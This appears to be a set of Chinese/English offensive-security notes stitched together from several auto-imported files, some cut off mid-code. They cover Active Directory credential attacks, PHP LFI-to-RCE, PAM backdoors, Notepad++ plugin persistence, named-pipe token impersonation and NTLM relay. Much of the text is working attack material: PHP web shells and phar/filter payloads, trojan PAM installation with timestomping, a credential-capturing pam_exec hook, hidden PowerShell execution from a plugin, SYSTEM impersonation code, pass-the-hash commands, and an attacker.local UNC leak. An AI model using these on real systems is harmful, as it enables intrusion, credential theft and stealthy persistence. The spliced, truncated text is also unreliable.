content: 来源路径： 02-知识点/域与Windows/Pass the Certificate 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Pass the Certificate 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Pass the Certificate 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Pass the Certificate 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Pass the Certificate、Theory、Practice；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 8 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Pass the Certificate Theory Practice # 核心要点 Pass the Certificate is the fancy name given to the pre - 认证 operation relying on a certificate (i.e. key pair) to pass in order to obtain a TGT. This operation is often conducted along shadow 凭据，AD CS escalation and UnPAC-the - 哈希 attacks. Keep in mind a certificate in itself cannot be used for 认证 without the knowledge of the private key. A certificate is signed for a specific public key, that was generated along with a private key, which should be used when relying on a certificate for 认证. The "certificate + private key" pair is usually used in the following manner PEM certificate + PEM private key PFX certificate export (which contains the private key) + PFX 密码 (which protects the PFX certificate export) From UNIX-like systems, Dirk-jan's gettgtpkinit.py from PKINITtools tool to request a TGT (Ticket Granting Ticket) for the target object. That tool supports the use of the certificate in multiple forms. conduct an UnPAC-the - 哈希 attack. This can be done with getnthash.py from PKINITtools. obtain access to the account's SPN with an S4U2Self. This can be done with gets4uticket.py from PKINITtools. authenticate with pass-the-ticket conduct an UnPAC-the - 哈希 attack (add the /getcredentials flag to Rubeus's asktgt command) This technique extends the notion of Pass the Certificate, thus dubbed by myself, @ nwodtuhs, in a Twitter thread about AD CS and PKINIT here. Even if both techniques share the same name and the same concept, the 认证 method is different. Schannel is not subject to LDAP signing either as the bind is performed after a StartTLS command when used on the LDAP TCP port. 工具 like PassTheCert (python version) and Certipy can be used to authenticate with the certificate via Schannel against LDAP. It can also be done with this Invoke-PassTheCert fork (PowerShell version). Note: the README contains the 方法论 to request a certificate using certreq from Windows (with a 密码，or an NTHash), and provides numerous actions (e.g. raw LDAP queries, Shadow 凭据 枚举 & 利用，DnsRecords 枚举，etc.) # 命令 / 载荷 / 操作片段 # 1. Practice 12345678# PFX certificate (file) + password (string, optionnal)gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"# Base64-encoded PFX certificate (string) (password can be set)gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"# PEM certificate (file) + PEM private key (file)gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE" # 2. Practice 1certipy auth -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -dc-ip 'dc-ip' -username 'user' -domain 'domain' # 3. Practice 123456# extract key and cert from the pfxcertipy cert -pfx "PATH_TO_PFX_CERT" -nokey -out "user.crt"certipy cert -pfx "PATH_TO_PFX_CERT" -nocert -out "user.key"# elevate a user for DCSYNC with passthecert.pypassthecert.py -action modify_user -crt "PATH_TO_CRT" -key "PATH_TO_KEY" -domain "domain.local" -dc-ip "DC_IP" -target "SAM_ACCOUNT_NAME" -elevate # 4. Practice 1234netexec <proto> <ip> --pfx-cert "PATH_TO_PFX_CERT" -u usernetexec <proto> <ip> --pfx-cert "PATH_TO_PFX_CERT" --pfx-pass "CERT_PASSWORD" -u usernetexec <proto> <ip> --pfx-base64 "PATH_TO_PFX_CERT" -u usernetexec <proto> <ip> --pem-cert "PATH_TO_CRT" --pem-key "PATH_TO_KEY" -u user # 5. Practice 1Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"[REDACTED_SECRET]" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show # 6. Practice 12345678910# If you use Certipy to retrieve certificates, you can extract key and cert from the pfx by using:$ certipy cert -pfx user.pfx -nokey -out user.crt$ certipy cert -pfx user.pfx -nocert -out user.key# elevate a user (it assumes that the domain account for which the certificate was issued, holds privileges to elevate user)passthecert.py -action modify_user -crt user.crt -key user.key -domain domai

The prerequisite for this method is to be able to 上传 a file. The tester need to compile this script into a .phar file that when called would write a shell called shell.txt . Now the tester has a phar file named shell.jpg and he can trigger it through the phar:// wrapper. # 命令 / 载荷 / 操作片段 # 1. PHP wrappers and streams 12345# Shell in base64 encodingecho "<?php system($_GET['cmd']); ?>" | base64# Accessing the log file via LFIcurl --user-agent "PENTEST" "$URL/?parameter=data://text/plain;base64,$SHELL_BASE64&cmd=id" # 2. PHP wrappers and streams 12# Testers should make sure to change the $URLcurl --user-agent "PENTEST" -s -X POST --data "<?php system('id'); ?>" "$URL?parameter=php://input" # 3. PHP wrappers and streams 12# Testers should make sure to change the $URL, $FILTERS with the chaining that generates their payload and $FILE with the path to the file they can read.curl --user-agent "PENTEST" "$URL?parameter=php://filter/$FILTERS/resource=$FILE" # 4. PHP wrappers and streams 1234567891011# Example: generate <?=`$_GET[cmd]`;;?> (base64 value: PD89YCRfR0VUW2NtZF1gOzs/Pg) using /etc/passwd file to run whoami command on the target.# Generate the payloadpython3 php_filter_chain_generator.py --chain '<?=`$_GET[cmd]`;;?>'# Fill variablesFILTERS="convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|[...]|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode"FILE="/etc/passwd"# Get RCE on the targetcurl --user-agent "PENTEST" "$URL?parameter=php://filter/$FILTERS/resource=$FILE&cmd=whoami" # 5. PHP wrappers and streams 1curl --user-agent "PENTEST" -s "$URL/?parameter=expect://id" # 6. PHP wrappers and streams 12345echo "<?php system($_GET['cmd']); ?>" > payload.phpzip payload.zip payload.php# Accessing the log file via LFI (the # identifier is URL-encoded)curl --user-agent "PENTEST" "$URL/?parameter=zip://payload.zip%23payload.php&cmd=id" # 7. PHP wrappers and streams 1234567<?php$phar = new Phar('shell.phar');$phar->startBuffering();$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');$phar->setStub('<?php __HALT_COMPILER(); ?>');$phar->stopBuffering(); # 8. PHP wrappers and streams 1php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg # 9. PHP wrappers and streams 1curl --user-agent "PENTEST" "$URL/?parameter=phar://./shell.jpg%2Fshell.txt&cmd=id" # 工具与参考入口 php filter chain generator.py PHP filters chain: What is it and how to use it the original writeup # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Sufficient: Success bypasses the rest of the same realm's checks unless a subsequent module fails. When backdooring PAM, the location of the inserted rule is often more important than the 载荷 itself: Atomic overwrite – write to a temp file and mv into place to avoid half-written libraries that would lock out SSH. rpm -V pam or debsums -s libpam-modules to spot replaced libraries without manual hashing. auth optional pam exec.so quiet expose authtok ... is the usual choice for credential capture because it runs before the session opens. # 命令 / 载荷 / 操作片段 # 1. Configuration Files 12345678910auth required /lib/security/pam_securetty.soauth required /lib/security/pam_nologin.soauth sufficient /lib/security/pam_ldap.soauth required /lib/security/pam_unix_auth.so try_first_passaccount sufficient /lib/security/pam_ldap.soaccount required /lib/security/pam_unix_acct.sopassword required /lib/security/pam_cracklib.sopassword required /lib/security/pam_ldap.sopassword required /lib/security/pam_pwdb.so use_first_passsession required /lib/security/pam_unix_session.so # 2. Compilation 速查 12345gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpammv /lib/security/pam_unix.so /lib/security/pam_unix.so.bakmv pam_unix.so /lib/security/pam_unix.sochmod 644 /lib/security/pam_unix.so # keep original permstouch -r /bin/ls /lib/security/pam_unix.so # timestomp # 3. Quick triage commands (post-compromise or threat hunting) 12345678910111213# 1) Spot alien PAM objectsfind /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'# 2) Verify package integritycommand -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules# 3) Identify non-packaged PAM modulesfor f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";done# 4) Look for stealth config editsgrep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec' # 4. Abusing pam exec for 持久化 12# Run on successful auth and receive the typed password on stdinauth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh # 5. title: Over 哈希传递-Pass the Key
content: 来源路径： 02-知识点/域与Windows/Over 哈希传递-Pass the Key.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Over 哈希传递 - Pass the Key [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Over 哈希传递 - Pass the Key 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Over 哈希传递 - Pass the Key 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Over 哈希传递 / Pass the Key、Overpass The 哈希 / Pass The Key (PTK)、检测 notes、Stealthier version；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 7 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Over 哈希传递 / Pass the Key Overpass The 哈希 / Pass The Key (PTK) 检测 notes Stealthier version # 核心要点 Over - 哈希传递 usually means turning the NT 哈希 into a Kerberos TGT via the RC4-HMAC Kerberos key. Pass-the-Key is the more generic version where you already have a Kerberos key such as AES128/AES256 and request a TGT directly with it. This difference matters in hardened environments: if RC4 is disabled or no longer assumed by the KDC, the NT 哈希 alone is not enough and you need an AES key (or the cleartext 密码 to derive it). getTGT.py also supports requesting a service ticket directly through an AS-REQ with -service <SPN>, which can be useful when you want a ticket for a specific SPN without an extra TGS-REQ: Moreover, the acquired ticket might be employed with various 工具，including smbexec.py or wmiexec.py, broadening the scope of the attack. Encountered issues such as PyAsn1Error or KDC cannot find the name are typically resolved by updating the Impacket library or using the hostname instead of the IP address, ensuring compatibility with the Kerberos KDC. Rubeus asktgt sends the raw Kerberos AS-REQ/AS-REP itself and does not need admin rights unless you want to target another logon session with /luid or create a separate one with /createnetonly. mimikatz sekurlsa::pth patches credential material into a logon session and therefore touches LSASS, which usually requires local admin or SYSTEM and is noisier from an EDR perspective. TicketEncryptionType tells you which enctype was used for the issued TGT. Typical values are 0x17 for RC4-HMAC, 0x11 for AES128, and 0x12 for AES256. Seeing 0x17 in a modern environment is a good clue that the account, host, or KDC fallback path still permits RC4 and is therefore more friendly to NT - 哈希 - based Over - 哈希传递. # 命令 / 载荷 / 操作片段 # 1. Overpass The 哈希 / Pass The Key (PTK) 123python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7export KRB5CCNAME=/root/impacket-examples/velociraptor.ccachepython psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass # 2. Overpass The 哈希 / Pass The Key (PTK) 123python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>export KRB5CCNAME=velociraptor.ccachepython wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park # 3. Overpass The 哈希 / Pass The Key (PTK) 1python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor # 4. Overpass The 哈希 / Pass The Key (PTK) 12.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd # 5. Overpass The 哈希 / Pass The Key (PTK) 12sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exesekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe # 6. Overpass The 哈希 / Pass The Key (PTK) 1.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec # 7. Stealthier version 1.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt # 工具与参考入口 https://www.tarlogic.com/es/blog/como-atacar-kerberos/ https://github.com/GhostPack/Rubeus # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/Notepad++ Plugin Autoload 持久化 & Execution.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Notepad++ Plugin Autoload 持久化 & Execution [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Notepad++ Plugin Autoload 持久化 & Execution 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Notepad++ Plugin Autoload 持久化 & Execution 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Writable plugin locations、Plugin load points (execution primitives)、Minimal malicious plugin skeleton、Low-noise trigger pattern via beNotified、Using the plugin config directory as secondary storage；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Writable plugin locations Plugin load points (execution primitives) Minimal malicious plugin skeleton Low-noise trigger pattern via beNotified Using the plugin config directory as secondary storage Reflective loader plugin pattern 检测 and hardening notes # 核心要点 Standard install: C:\Program Files\Notepad++\plugins<PluginName><PluginName>.dll (usually requires admin to write). Writable options for low-privileged operators: Hunt for admin tool bundles, extracted zip copies, or help-desk toolkits that already contain doLocalConf.xml and live outside Program Files. beNotified(SCNotification)* — receives Notepad++ / Scintilla events (useful to defer 载荷 until a user action or editor event). For OPSEC, many 载荷 should not fire from DllMain. A quieter pattern is to let the plugin load cleanly, then execute only after a realistic editor event such as startup complete, buffer activation, or the first typed character. Accept a file path or URL to fetch a 载荷 DLL. Benefit: reuse a benign-looking GUI process instead of spawning a new loader; 载荷 inherits the integrity of notepad++.exe (including elevated contexts). Block or monitor writes to Notepad++ plugin directories (including portable copies in user profiles); enable controlled folder access or application allowlisting. Baseline legitimate plugins and investigate any new DLL that exports the normal Notepad++ plugin interface but also spawns shells, PowerShell, or network beacons. # 命令 / 载荷 / 操作片段 # 1. Writable plugin locations 123where /r C:\ notepad++.exe 2>nulfor /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fDicacls "C:\Program Files\Notepad++\plugins" 2>nul # 2. Minimal malicious plugin skeleton 1234567BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }extern "C" __declspec(dllexport) void setInfo(NppData) {}extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; } # 3. Low-noise trigger pattern via beNotified 12345678910static bool fired = false;extern "C" __declspec(dllexport) void beNotified(SCNotification *n) { if (fired) return; if (n->nmhdr.code == NPPN_READY || n->nmhdr.code == NPPN_BUFFERACTIVATED || n->nmhdr.code == SCN_CHARADDED) { fired = true; WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE); }} # 4. Using the plugin config directory as secondary storage 123wchar_t cfg[MAX_PATH] = {0};SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);// Example result: %AppData%\Notepad++\plugins\config # 工具与参考入口 TrustedSec：Notepad++ Plugins: Plug and 载荷 Notepad++ User Manual：Plugins Notepad++ User Manual：Plugin Communication # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

PCredz (Python) is a good example and allows extraction of credit card numbers, NTLM (DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23, i.e. ASREQroast), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP, etc from a pcap file or from a live interface. SMB is a protocol for sharing files, printers, and ports. It operates directly over TCP (port 445) or via NetBIOS over TCP (ports 137, 138). This dual compatibility enhances connectivity with various devices. # 命令 / 载荷 / 操作片段 # 1. For end-to-end 利用 chains that coerce SYSTEM to your pipe, see the Potato family pages referenced below. Make a privileged component connect to it (spooler/DCOM/EFSRPC/etc.). Read at least one message from the pipe, then call ImpersonateNamedPipeClient. Open the impersonation 令牌 from the current thread, DuplicateTokenEx (TokenPrimary), and CreateProcessWithTokenW/CreateProcessAsUser to get a SYSTEM process. Privileges typically needed by the calling process/thread: SeImpersonatePrivilege to successfully impersonate a connecting client and to use CreateProcessWithTokenW. Alternatively, after impersonating SYSTEM, you can use CreateProcessAsUser, which may require SeAssignPrimaryTokenPrivilege and SeIncreaseQuotaPrivilege (these are satisfied when you’re impersonating SYSTEM). ReadFile/WriteFile (must read at least one message before impersonation) OpenThreadToken, DuplicateTokenEx(TokenPrimary) CreateProcessWithTokenW or CreateProcessAsUser If ImpersonateNamedPipeClient returns ERROR CANNOT IMPERSONATE (1368), ensure you read from the pipe first and that the client didn’t restrict impersonation to Identification level. Prefer DuplicateTokenEx with SecurityImpersonation and TokenPrimary to create a primary 令牌 suitable for process creation. DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato) List pipes quickly from PowerShell: Get-ChildItem \.\pipe\ # 命令 / 载荷 / 操作片段 # 1. Minimal Win32 workflow (C) 1234567891011121314151617181920212223242526272829303132333435363738394041// Minimal skeleton (no error handling hardening for brevity)#include <windows.h>#include <stdio.h>int main(void) { LPCSTR pipe = "\\\\.\\pipe\\evil"; HANDLE hPipe = CreateNamedPipeA( pipe, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 1, 0, 0, 0, NULL); if (hPipe == INVALID_HANDLE_VALUE) return 1; // Wait for privileged client to connect (see Triggers section) if (!ConnectNamedPipe(hPipe, NULL)) return 2; // Read at least one message before impersonation char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL); // Impersonate the last message sender if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368 // Extract and duplicate the impersonation token into a primary token HANDLE impTok = NULL, priTok = NULL; if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4; if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5; // Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege. STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0}; if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, 0, NULL, NULL, &si, &pi)) { // Fallback: CreateProcessAsUser after you already impersonated SYSTEM CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi); } RevertToSelf(); // Restore original context return 0;} # 2. .NET quick example 1234567891011121314151617using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;class P { [DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h); [DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p); [DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool Cr

content: 来源路径： 02-知识点/域与Windows/NTLM 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # NTLM 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 NTLM 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 NTLM 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：NTLM、Theory、Basic Information、LM, NTLMv1 and NTLMv2、GUI；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 17 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 NTLM Theory Basic Information LM, NTLMv1 and NTLMv2 GUI Registry Basic NTLM Domain 认证 Scheme Local NTLM 认证 Scheme NTLMv1 Challenge NTLMv1 attack NTLMv1 attack with hashcat NTLMv2 Challenge 哈希传递 Mimikatz 哈希传递 from linux Impacket Windows compiled 工具 Invoke-TheHash Invoke-SMBExec # 核心要点 A common error people do is mix LM, NT, NTLM, Net-NTLM etc. Let's make things clear. There are hashing formats used to store user passwords: LM, NT. And there are 认证 protocols used to authenticate users to remote resources: LM, NTLMv1, and NTLMv2 ( LM 哈希 and NT 哈希 will refer to the hashing formats LM, NTLM (v1), and NTLMv2, will refer to the 认证 protocols LMv1 and LMv2 are response formats that clients return when responding to NTLM CHALLENGE NTLMv1 and NTLMv2 messages, respectively. a secret key that is the 哈希 of the user's 密码 The following table details the hashing algorithm used by each hashing format in Windows that allows the system to transform the user's 密码 in a non-reversible format. a bruteforce attack against the LM/NTLM response to retrieve the LM or NT 哈希 it was derivated from if found, a bruteforce/dictionary attack against the NT 哈希 to retrieve the user's 密码 The presence of the "NTLMSSP" header in network packets signals an NTLM 认证 process. Support for the 认证 protocols：LM, NTLMv1, and NTLMv2：is facilitated by a specific DLL located at % windir%\Windows\System32\msv1\ 0.dll. LM hashes are vulnerable and an empty LM 哈希 (AAD3B435B51404EEAAD3B435B51404EE) signifies its non-use. Kerberos is the default 认证 method, with NTLM used only under certain conditions. NTLM 认证 packets are identifiable by the "NTLMSSP" header. LM, NTLMv1, and NTLMv2 protocols are supported by the system file msv1\ 0.dll. The 3 parts can be attacked separately to find the NT 哈希 Given the same challenge the response will be same. So, you can give as a challenge to the victim the string "1122334455667788" and attack the response used precomputed rainbow tables. Once you have the 哈希 of the victim, you can use it to impersonate it.\ Please, remember that you can perform 哈希传递 attacks also using Computer accounts. psexec windows.exe C:\AD\MyTools\psexec windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local wmiexec.exe wmiexec windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local atexec.exe (In this case you need to specify a command, cmd.exe and powershell.exe are not valid to obtain an interactive shell)C:\AD\MyTools\atexec windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami' For more information about how to obtain 凭据 from a Windows host you should read this page**.** # 命令 / 载荷 / 操作片段 # 1. Registry 1reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f # 2. Registry 1234560 - Send LM & NTLM responses1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated2 - Send NTLM response only3 - Send NTLMv2 response only4 - Send NTLMv2 response only, refuse LM5 - Send NTLMv2 response only, refuse LM & NTLM # 3. NTLMv1 attack with hashcat 1python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788 # 4. NTLMv1 attack with hashcat 1234567891011121314151617181920212223['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']Hostname: DUSTIN-5AA37877Username: hashcatChallenge: 1122334455667788LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04DNT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595CT1: 727B4E35F947129ECT2: A52B9CDEDAE86934CT3: BB23EF89F50FC595To Calculate final 4 characters of NTLM hash use:./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788To crack with hashcat create a file with the following contents:727B4E35F947129E:1122334455667788A52B9CDEDAE86934:1122334455667788To crack with hashcat:./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1To Crack with crack.sh use the following tokenNTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595 # 5. NTLMv1 attack with hashcat 12727B4E35F947129E:1122334455667788A52B9CDEDAE86934:112233

title: NET SOAP-WSDL Client Proxy Abuse 技术笔记
content: 来源路径： 02-知识点/域与Windows/NET SOAP-WSDL Client Proxy Abuse 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # NET SOAP-WSDL Client Proxy Abuse 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 NET SOAP-WSDL Client Proxy Abuse 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 NET SOAP-WSDL Client Proxy Abuse 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：.NET SOAP/WSDL Client Proxy Abuse、TL;DR、Root cause: HttpWebClientProtocol is scheme-agnostic、Primitive 1 – NTLM capture /relay via UNC targets、Primitive 2 – Arbitrary file writes via file://；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 1 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 .NET SOAP/WSDL Client Proxy Abuse TL;DR Root cause: HttpWebClientProtocol is scheme-agnostic Primitive 1 – NTLM capture / relay via UNC targets Primitive 2 – Arbitrary file writes via file:// # 核心要点 If an attacker controls the proxy Url, the framework silently swaps in FileWebRequest, FtpWebRequest or UNC/SMB handlers, turning "HTTP" proxies into NTLM leak gadgets or arbitrary file writers. SoapHttpClientProtocol.Invoke() then streams the SOAP POST body through whatever transport handler was selected, even if that means writing to disk or over SMB. Point it to a UNC path like file://attacker.local/sink/ 载荷. The CLR opens the path via SMB and performs integrated 认证，leaking NTLM challenge/response to the attacker. Use captured hashes for offline cracking or NTLM 中继 (SMB/HTTP) if signing/EPA are absent. This applies to any .NET SOAP/HTTP proxy path that accepts user input, even if no further 利用 is possible. # 命令 / 载荷 / 操作片段 # 1. Primitive 2 – Arbitrary file writes via file:// 12345678910111213141516171819202122232425and point `Url` to `file:///.../webroot/shell.aspx` to gain RCE.- **Namespace injection**: Even when arguments are hard-coded (e.g., Umbraco 